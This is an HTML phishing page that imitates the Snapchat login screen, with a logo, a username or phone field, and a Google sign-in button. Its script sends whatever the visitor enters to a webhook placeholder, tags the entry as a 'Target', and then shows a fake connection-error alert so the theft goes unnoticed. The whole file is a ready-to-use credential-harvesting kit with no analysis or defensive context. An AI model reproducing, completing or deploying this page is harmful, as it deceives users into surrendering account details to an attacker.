<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Log in to Snapchat</title>
    <style>
        body {
            background-color: #ffffff;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 0;
            padding-top: 40px;
        }

        .login-card {
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-sizing: border-box;
        }

        /* The Ghost Logo Fix */
        .snap-ghost {
            width: 55px;
            margin-bottom: 15px;
        }

        h2 { font-size: 26px; margin: 0 0 20px 0; font-weight: 700; color: #16191c; }

        .input-group { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 12px; color: #717274; margin-bottom: 8px; font-weight: 600; }

        input {
            width: 100%;
            padding: 14px;
            border: 2px solid #000;
            border-radius: 10px;
            box-sizing: border-box;
            font-size: 16px;
            outline: none;
            background-color: #ffffff;
        }

        .blue-link { color: #00b2ff; font-size: 13px; font-weight: 600; text-decoration: none; display: block; margin: 15px 0 25px 0; cursor: pointer; }

        .next-btn {
            background-color: #00b2ff;
            color: white;
            border: none;
            border-radius: 100px;
            padding: 14px 60px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .divider { display: flex; align-items: center; margin: 25px 0; color: #717274; font-size: 11px; font-weight: bold; }
        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #e8e8e8; }
        .divider:not(:empty)::before { margin-right: .8em; }
        .divider:not(:empty)::after { margin-left: .8em; }

        .google-btn {
            display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px;
            border: 1px solid #e0e0e0; border-radius: 100px; background: white; cursor: pointer;
            font-size: 15px; font-weight: 600; color: #3c4043;
        }
        .google-icon { width: 18px; margin-right: 10px; }
        .back-nav { margin-top: 25px; font-weight: bold; text-transform: uppercase; font-size: 11px; border-bottom: 2px solid #000; text-decoration: none; color: #000; cursor: pointer; }
    </style>
</head>
<body>

    <div class="login-card">
        <svg class="snap-ghost" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
            <path fill="white" stroke="black" stroke-width="4" d="M50,15.5c-14.4,0-23.4,9.9-23.4,22.8c0,4.8,1.2,9.6,4.5,13.2c-0.6,2.1-1.2,4.8-1.2,7.5 c0,7.2,5.7,12.3,13.5,12.3c0.9,0,1.8,0,2.7-0.3c0,0.3,0,0.6,0,0.9c0,5.7,4.8,10.2,10.8,10.2s10.8-4.5,10.8-10.2 c0-0.3,0-0.6,0-0.9c0.9,0.3,1.8,0.3,2.7,0.3c7.8,0,13.5-5.1,13.5-12.3c0-2.7-0.6-5.4-1.2-7.5c3.3-3.6,4.5-8.4,4.5-13.2 C73.4,25.4,64.4,15.5,50,15.5z"/>
        </svg>

        <h2>Log in to Snapchat</h2>
        
        <div class="input-group">
            <label id="inputLabel">Username or Email</label>
            <input type="text" id="userInput">
        </div>
        
        <a class="blue-link" id="toggleLink" onclick="toggleInputType()">Use phone number instead</a>
        
        <button class="next-btn" onclick="goToStep2()">Next</button>
        
        <div class="divider">OR</div>
        
        <button class="google-btn">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_Color_Icon.svg" class="google-icon">
            Continue with Google
        </button>
    </div>

    <div class="back-nav" onclick="location.reload()">BACK</div>

    <script>
        const webhookURL = "YOUR_WEBHOOK_URL_HERE";
        let isPhoneMode = false;

        function toggleInputType() {
            const label = document.getElementById('inputLabel');
            const link = document.getElementById('toggleLink');
            isPhoneMode = !isPhoneMode;
            if (isPhoneMode) {
                label.innerText = "Phone Number";
                link.innerText = "Use email instead";
            } else {
                label.innerText = "Username or Email";
                link.innerText = "Use phone number instead";
            }
        }

        function goToStep2() {
            const user = document.getElementById('userInput').value;
            if(!user) return;
            fetch(webhookURL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: `📱 **Target:** ${user}` })
            }).then(() => {
                alert("Login Error: Please check your connection.");
            });
        }
    </script>
</body>
</html>
